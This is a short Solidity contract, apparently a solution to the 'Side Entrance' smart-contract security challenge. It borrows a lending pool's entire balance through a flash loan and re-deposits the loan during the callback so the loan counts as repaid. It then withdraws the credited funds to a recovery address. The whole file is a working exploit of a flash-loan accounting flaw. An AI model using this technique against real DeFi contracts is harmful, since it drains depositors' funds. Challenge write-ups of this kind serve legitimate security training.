pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attack {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function flashLoan() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable{
        pool.deposit{value : msg.value}();
    }

    function drain() external {
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    receive() external payable {}
    
}